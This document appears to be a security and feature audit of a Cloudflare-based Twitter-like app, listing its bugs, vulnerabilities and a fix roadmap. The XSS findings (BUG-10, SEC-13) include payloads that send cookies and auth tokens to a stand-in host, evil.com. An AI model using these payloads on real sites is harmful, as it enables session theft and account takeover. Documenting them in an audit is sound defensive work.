# The Wire - Implementation Plan

## Executive Summary

This document captures the comprehensive code audit findings for "The Wire" - a Twitter-like social network built on Cloudflare edge infrastructure. The codebase implements approximately 70% of the planned features, with a solid foundation but missing key differentiating features and requiring security hardening before production deployment.

---

## Original Specification

### Goal
Build a fully featured, globally distributed Twitter-like social network running entirely on Cloudflare edge infrastructure, prioritizing low latency, horizontal scalability, and eventual consistency.

### Core Stack
- Cloudflare Workers (HTTP API + edge logic)
- Durable Objects (stateful coordination)
- Workers KV (global read-heavy data)
- R2 (media storage)
- Queues (fan-out + async work)
- Cron Triggers (ranking + cleanup jobs)

---

## Feature Analysis: Implemented vs. Missing

### 1. Core Stack

| Component | Spec Requirement | Status | Notes |
|-----------|-----------------|--------|-------|
| Cloudflare Workers | HTTP API + edge logic | ✅ Implemented | Hono framework |
| Durable Objects | Stateful coordination | ✅ Implemented | UserDO, PostDO, FeedDO |
| Workers KV | Global read-heavy data | ✅ Implemented | USERS_KV, POSTS_KV, SESSIONS_KV, FEEDS_KV |
| R2 | Media storage | ✅ Implemented | MEDIA_BUCKET |
| Queues | Fan-out + async work | ⚠️ Partial | Queue defined but fan-out incomplete |
| Cron Triggers | Ranking + cleanup jobs | ❌ Not Implemented | Defined in wrangler.toml but no handler |

### 2. Identity & Authentication

| Feature | Status | Notes |
|---------|--------|-------|
| Email + password signup | ✅ Implemented | `auth.ts` |
| Hash + salt storage | ✅ Implemented | PBKDF2 with 100k iterations |
| JWT tokens | ✅ Implemented | Using `jose` library |
| Token validation at edge | ✅ Implemented | Middleware |
| No email verification | ✅ Correctly skipped | Per spec |

### 3. Users & Profiles

| Feature | Status | Notes |
|---------|--------|-------|
| One UserDO per user | ✅ Implemented | |
| Public profile page | ✅ Implemented | |
| Avatar, display name, @handle | ✅ Implemented | |
| Bio, location, website | ✅ Implemented | |
| Join date | ✅ Implemented | `joinedAt` field |
| Follower/following counts | ✅ Implemented | |
| Post count | ✅ Implemented | |
| Follows list | ✅ Implemented | |
| Followers list | ✅ Implemented | |
| Block list | ✅ Implemented | |
| Muted words | ✅ Implemented | In UserSettings |
| User bans | ❌ Missing | No ban system |
| Profile verification | ⚠️ Stub only | Field exists but no verification logic |

### 4. Posts (Notes)

| Feature | Status | Notes |
|---------|--------|-------|
| Immutable posts | ✅ Implemented | |
| Snowflake IDs | ✅ Implemented | Custom implementation |
| 280 character limit | ✅ Implemented | Configurable via env |
| Media URLs in posts | ✅ Implemented | |
| Reply support | ✅ Implemented | `replyToId` field |
| Quote posts | ✅ Implemented | `quoteOfId` field |
| Like count | ✅ Implemented | PostDO coordination |
| Reply count | ✅ Implemented | |
| Repost count | ⚠️ Partial | Counter exists but no repost API |
| Quote count | ✅ Implemented | |
| Deleted flag | ✅ Implemented | Soft delete |

### 5. Media

| Feature | Status | Notes |
|---------|--------|-------|
| Image upload | ✅ Implemented | JPEG, PNG, WebP, GIF |
| Video upload | ✅ Implemented | MP4, WebM |
| R2 storage | ✅ Implemented | |
| Avatar upload | ✅ Implemented | |
| Banner upload | ✅ Implemented | |
| Image resizing params | ✅ Implemented | Width, height, quality, fit |
| Actual image transformation | ❌ Not working | R2 objects don't support CF Image Resizing directly |

### 6. Feed System

| Feature | Status | Notes |
|---------|--------|-------|
| One FeedDO per user | ✅ Implemented | |
| Ordered post IDs | ✅ Implemented | |
| Pagination with cursor | ✅ Implemented | Base64 encoded |
| Block list filtering | ✅ Implemented | |
| Muted words filtering | ✅ Implemented | |
| Round-robin merge algorithm | ❌ Missing | Spec: "2 posts from followed + 1 FoF" |
| Friends-of-friends posts | ❌ Missing | Not implemented |
| Hacker News ranking | ❌ Missing | Not implemented |
| Cron-based ranking updates | ❌ Missing | No cron handler |

### 7. Fan-out System

| Feature | Status | Notes |
|---------|--------|-------|
| Queue configuration | ✅ Implemented | FANOUT_QUEUE |
| Queue consumer | ✅ Implemented | `queue()` function in index.ts |
| Fan-out on post creation | ✅ Implemented | Sends to followers |
| Delete fan-out | ⚠️ Partial | Message type exists but not processed |

### 8. Moderation

| Feature | Status | Notes |
|---------|--------|-------|
| Blocked user filtering | ✅ Implemented | In feed |
| Muted words filtering | ✅ Implemented | In feed |
| User-level bans | ❌ Missing | No admin ban system |
| Post takedowns | ❌ Missing | Only self-delete |
| Ban enforcement globally | ❌ Missing | |

### 9. Real-time (Optional)

| Feature | Status | Notes |
|---------|--------|-------|
| WebSocket DOs | ❌ Not Implemented | Stub only (501 response) |
| Live feed updates | ❌ Missing | |
| Notifications | ❌ Missing | |

### 10. Testing

| Feature | Status | Notes |
|---------|--------|-------|
| Scale test: 1000 users | ❌ Incomplete | `load-harness.ts` is a stub with no implementation |
| Random follow graphs | ❌ Not Implemented | Planned in harness but not coded |
| Posts, likes, replies | ❌ Not Implemented | Test structure exists but no test code |
| Media uploads in tests | ❌ Missing | |
| Load simulation | ❌ Not Implemented | `small-test.ts` is empty stub |
| Feed correctness verification | ❌ Not Implemented | |
| Muted/blocks propagation test | ❌ Missing | |
| Unit tests | ✅ Implemented | Crypto, JWT, validation, snowflake |
| Integration tests | ⚠️ Partial | Auth only, no posts/feed tests |

---

## Bugs Identified

### BUG-1: Image Resizing Doesn't Work
**Location:** `handlers/media.ts:167-178`
**Issue:** Cloudflare Image Resizing requires requests through CF's proxy with image URLs, not R2 object bodies. The `cf.image` option only works with fetch requests to image URLs.
**Fix:** Remove non-functional params or implement via image processing library.

### BUG-2: CounterDO Not Implemented
**Location:** `index.ts:540-545`
**Issue:** Defined in wrangler.toml but returns 501 Not Implemented.
**Fix:** Either implement or remove from config.

### BUG-3: Delete Post Doesn't Remove from Feeds
**Location:** `handlers/posts.ts` delete endpoint
**Issue:** PostDO marked deleted, KV updated, but entries NOT removed from followers' FeedDOs. Delete fan-out message sent but not processed.
**Fix:** Implement delete_post handler in queue consumer.

### BUG-4: Feed FoF Source Never Used
**Location:** `types/feed.ts`
**Issue:** The `'fof'` source type defined but never populated.
**Fix:** Implement FoF feature or remove type.

### BUG-5: Profile Cache Invalidation Incomplete
**Location:** `durable-objects/UserDO.ts:74`
**Issue:** Only invalidates cache by handle, profile might be cached elsewhere.
**Fix:** Clear all related cache keys.

### BUG-6: Media URL Generation is Relative
**Location:** `handlers/media.ts:25-27`
**Issue:** Returns relative URLs which won't work for external sharing/embedding.
**Fix:** Generate absolute URLs using request host or config.

### BUG-7: Cron Handlers Missing
**Location:** `wrangler.toml:55-58`
**Issue:** Cron triggers defined but no `scheduled()` handler exported.
**Fix:** Implement scheduled handler.

### BUG-8: Race Condition in Signup
**Location:** `handlers/auth.ts:54-85`
**Issue:** No atomic transaction for email/handle uniqueness check and user creation. Two concurrent signups with the same email/handle could both pass validation and create duplicate entries.
**Fix:** Use KV `compare-and-swap` or implement mutex via Durable Object.

### BUG-9: Post Deletion Missing isDeleted in KV
**Location:** `handlers/posts.ts:180-185`
**Issue:** When deleting a post, the PostDO is marked deleted but the KV metadata doesn't set `isDeleted: true`. Deleted posts remain readable from cache.
**Fix:** Add `metadata.isDeleted = true` before KV put.

### BUG-10: XSS via Template String Interpolation
**Location:** `index.ts:611, 894, 911`
**Issue:** User-controlled values (`postId`, `handle`) are interpolated directly into HTML/JS without escaping:
```javascript
const postId = '${postId}';  // Line 611
<title>@${handle}</title>    // Line 894
const handle = '${handle}';  // Line 911
```
**Attack:** A handle like `"><script>alert(1)</script>` or postId like `'; fetch('evil.com?c='+document.cookie); '` could execute arbitrary scripts.
**Fix:** Escape all user input before interpolation or use proper templating.

### BUG-11: Queue Backoff Calculation Error
**Location:** `index.ts:1886`
**Issue:** Backoff uses `30 ** message.attempts` which grows extremely fast (30, 900, 27000, 810000...). The min() caps at 3600 but the calculation is wrong.
**Fix:** Use `Math.min(3600, 30 * (2 ** message.attempts))` for proper exponential backoff.

### BUG-12: Cursor Pagination Inconsistent After Filter Changes
**Location:** `durable-objects/FeedDO.ts:162-172`
**Issue:** Cursor index is calculated on post-filtered results. If blocked users or muted words change between requests, pagination will skip or duplicate entries.
**Fix:** Use timestamp-based cursors instead of index-based.

### BUG-13: Timing-Safe Comparison Leaks Length
**Location:** `utils/crypto.ts:66-68`
**Issue:** Early return when `a.length !== b.length` allows timing attacks to determine hash length differences.
**Fix:** Pad shorter string and always iterate full length, or use WebCrypto's `crypto.subtle.timingSafeEqual` if available.

### BUG-14: Follow Operation Missing Reciprocal Update
**Location:** `handlers/users.ts` (follow endpoint)
**Issue:** When user A follows user B, only A's `following` list is updated. B's `followers` list may not be updated if the handler doesn't call B's UserDO `addFollower` endpoint.
**Fix:** Verify both DO updates are made in follow handler.

---

## Security Issues

### Critical

#### SEC-1: No Rate Limiting
- No protection against brute force attacks on login
- No protection against signup spam
- No API request rate limits
**Fix:** Add KV-based rate limiter middleware

#### SEC-2: JWT Secret Fallback Missing
- If `JWT_SECRET` not set, middleware throws error
- Should fail closed in production
**Fix:** Add proper error handling and fallback for dev

#### SEC-3: Session Token Not Truly Revocable
- Stateless JWT with no blocklist
- If token compromised, no way to revoke until expiration
**Fix:** Document limitation or implement token blocklist

#### SEC-13: XSS via Template Interpolation (Critical)
**Location:** Multiple HTML templates in `index.ts`
**Issue:** User-controlled `postId` and `handle` values are directly interpolated into HTML and JavaScript without sanitization. This is exploitable.
**Attack Vector:**
- Malicious handle: `test"><script>document.location='https://evil.com/?c='+document.cookie</script>`
- Malicious postId: `'; fetch('https://evil.com/steal?token='+localStorage.getItem('auth_token')); '`
**Impact:** Session hijacking, credential theft, account takeover
**Fix:**
1. Escape all user input using HTML entity encoding
2. Use `textContent` instead of `innerHTML` where possible
3. Add Content-Security-Policy headers

### High

#### SEC-4: No CSRF Protection
- State-changing operations don't validate origin
- Vulnerable to cross-site request forgery
**Fix:** Add origin validation middleware

#### SEC-5: Password Reset Missing
- No password reset functionality
- Users can't recover accounts
**Fix:** Implement email or handle-based reset

#### SEC-6: No Account Lockout
- No lockout after failed login attempts
- Enables brute force attacks
**Fix:** Track failed attempts and lockout

#### SEC-7: Media Upload Validation Insufficient
- Only checks MIME type and size
- No magic byte validation
- No virus/malware scanning
**Fix:** Add magic byte validation

#### SEC-14: Missing Content-Security-Policy Headers
**Issue:** No CSP headers on HTML responses, allowing inline scripts and unrestricted resource loading.
**Fix:** Add CSP header: `Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'`

#### SEC-15: Race Condition Enables Duplicate Accounts
**Issue:** Signup check-then-write pattern allows race conditions. Attacker could create multiple accounts with same email by timing concurrent requests.
**Impact:** Account confusion, potential privilege escalation if email used for recovery
**Fix:** Implement atomic operations or distributed locking

### Medium

#### SEC-8: XSS Risk in Frontend
- Inline HTML construction with template literals
**Fix:** Use proper templating or sanitization

#### SEC-9: No Input Sanitization for URLs
- Website field accepts any URL
- Could be used for malicious redirects
**Fix:** Validate URL format and scheme

#### SEC-10: Handle Enumeration
- Different error messages for "email exists" vs "handle exists"
**Fix:** Use generic error message

#### SEC-11: No Audit Logging
- No logging of security-relevant events
**Fix:** Add audit log system

#### SEC-12: CORS Too Permissive
- Uses `cors()` with no origin restriction
**Fix:** Configure allowed origins

#### SEC-16: Unvalidated Query Parameters in FeedDO
**Location:** `durable-objects/FeedDO.ts:234-256`
**Issue:** `blocked` and `muted` query params are JSON.parsed without schema validation. Malformed JSON handled but type not validated.
**Fix:** Add type validation after JSON.parse

#### SEC-17: Media File Extension from User Input
**Location:** `handlers/media.ts:90-91`
**Issue:** File extension extracted from user-provided filename without validation.
```javascript
const extension = file.name.split('.').pop() || 'bin';
```
**Risk:** Could store files with misleading extensions
**Fix:** Derive extension from validated MIME type, not filename

---

## Architectural Concerns

### ARCH-1: Followers Array Scalability
**Location:** `durable-objects/UserDO.ts:13-14`
**Issue:** Followers stored as in-memory array. For users with 100k+ followers:
- DO state exceeds reasonable size limits
- Linear search for `includes()` becomes slow
- Full array loaded on every request
**Fix:**
- Paginate followers storage (store in chunks)
- Use separate FollowerDO sharded by follower ID prefix
- Move to KV for follower relationships

### ARCH-2: Likes Array in PostDO
**Location:** `durable-objects/PostDO.ts` (likes set)
**Issue:** Similar to followers - viral posts with millions of likes will cause performance issues.
**Fix:** Store likes in KV with `like:{postId}:{userId}` keys, maintain only count in DO.

### ARCH-3: No Sharding for High-Traffic Posts
**Issue:** Single PostDO per post creates hotspot for viral content. All like/view requests serialize through one DO.
**Fix:** Implement CounterDO with sharding for high-traffic counters.

### ARCH-4: KV Eventually Consistent Reads
**Issue:** Profile updates may not be immediately visible across regions due to KV eventual consistency.
**Mitigation:** Document this behavior; consider DO for critical reads.

---

## Implementation Roadmap

### P0 - Immediate (Security Critical)

- [ ] **Rate Limiting Middleware**
  - KV-based rate limiter
  - 5 login attempts per IP per minute
  - 10 signups per IP per hour
  - 100 API requests per user per minute

- [ ] **CSRF Protection**
  - Origin header validation
  - SameSite cookie configuration

- [ ] **Cron Handlers**
  - Implement `scheduled()` export
  - FoF ranking updates (every 15 min)
  - Feed cleanup (hourly)
  - KV compaction (daily)

- [ ] **Fix Media Serving**
  - Remove non-functional image resizing params
  - Generate absolute URLs
  - Add magic byte validation

- [ ] **Fix XSS Vulnerabilities (Critical)**
  - Escape user input in all HTML templates (postId, handle)
  - Add CSP headers to all HTML responses
  - Audit all template interpolations in index.ts

- [ ] **Fix Post Deletion**
  - Set `isDeleted: true` in KV metadata
  - Implement delete_post queue handler
  - Remove entries from followers' FeedDOs

- [ ] **Fix Signup Race Condition**
  - Implement atomic check-and-create
  - Consider using DO for email/handle reservation

- [ ] **Fix Queue Backoff**
  - Change to proper exponential: `30 * (2 ** attempts)`

### P1 - Short-term (Feature Completion)

- [ ] **Feed Algorithm**
  - Implement FoF post fetching
  - Round-robin merge (2 followed + 1 FoF)
  - Hacker News-style ranking for FoF

- [ ] **Moderation System**
  - Admin roles and permissions
  - User ban functionality
  - Post takedown capability
  - Global ban enforcement

- [ ] **Repost/Retweet**
  - POST /api/posts/:id/repost endpoint
  - Fan-out reposts to followers
  - Display reposts in feed

- [ ] **Password Reset**
  - Security question based (no email)
  - Time-limited reset tokens
  - Handle verification

### P2 - Medium-term (Enhancement)

- [ ] **WebSocket Real-time**
  - Implement WebSocketDO
  - Live feed updates
  - Connection management

- [ ] **Notifications System**
  - @mention detection
  - Like/reply/follow notifications
  - Notification preferences

- [ ] **User Timeline Endpoint**
  - GET /api/users/:handle/posts
  - Pagination support
  - Include replies option

- [ ] **Reply Thread View**
  - GET /api/posts/:id/thread
  - Recursive reply fetching
  - Thread pagination

---

## Summary

| Category | Complete | Partial | Missing |
|----------|----------|---------|---------|
| Core Infrastructure | 5 | 1 | 1 |
| Authentication | 4 | 1 | 0 |
| User/Profile | 11 | 1 | 2 |
| Posts | 8 | 2 | 0 |
| Media | 5 | 1 | 0 |
| Feed System | 5 | 0 | 4 |
| Fan-out | 2 | 2 | 0 |
| Moderation | 2 | 0 | 3 |
| Real-time | 0 | 0 | 3 |
| Testing | 2 | 1 | 6 |

**Overall Completion: ~65%**

**Critical Issues Before Production:**
1. XSS vulnerabilities in HTML templates (SEC-13, BUG-10)
2. Race condition in signup (SEC-15, BUG-8)
3. Missing rate limiting (SEC-1)
4. Post deletion doesn't propagate (BUG-3, BUG-9)
5. Queue backoff calculation error (BUG-11)

The foundation is solid, but **security issues must be resolved before any production deployment**. The feed algorithm and moderation features are the largest functional gaps. Testing coverage is significantly incomplete with scale/load tests being stubs only.